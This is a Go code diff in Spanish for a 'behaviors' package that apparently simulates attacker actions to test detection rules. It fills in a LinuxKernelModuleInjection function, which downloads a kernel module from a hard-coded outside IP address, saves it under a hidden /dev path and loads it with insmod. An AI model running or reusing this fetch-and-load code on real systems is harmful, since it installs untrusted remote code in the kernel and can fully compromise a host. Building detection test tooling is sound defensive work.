@@ -3,8 +3,11 @@ package behaviors
 import (
 	"bytes"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"time"
 )
@@ -117,9 +120,47 @@ func DirectoryTraversalMonitoredFileRead() {
 	// Lógica para Regla3
 }
 
-func LinuxKernelModuleInjection() {
+func LinuxKernelModuleInjection() error {
 	fmt.Println("Ejecutando: Linux Kernel Module Injection")
-	// Lógica para Regla3
+
+	url := "http://34.27.180.215/sitio/cust0m_mod.ko"
+	filePath := "/dev/ddd/cust0m.ko"
+	dirPath := filepath.Dir(filePath)
+
+	// Crear el directorio si no existe
+	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
+		if err := os.MkdirAll(dirPath, 0755); err != nil {
+			return err
+		}
+	}
+
+	// Descargar el archivo
+	response, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer response.Body.Close()
+
+	// Crear el archivo en el sistema de archivos
+	outFile, err := os.Create(filePath)
+	if err != nil {
+		return err
+	}
+	defer outFile.Close()
+
+	// Copiar el contenido descargado al archivo
+	_, err = io.Copy(outFile, response.Body)
+	if err != nil {
+		return err
+	}
+
+	// Inyectar el módulo del kernel
+	cmd := exec.Command("insmod", filePath)
+	if err := cmd.Run(); err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func ClearLogActivities() {
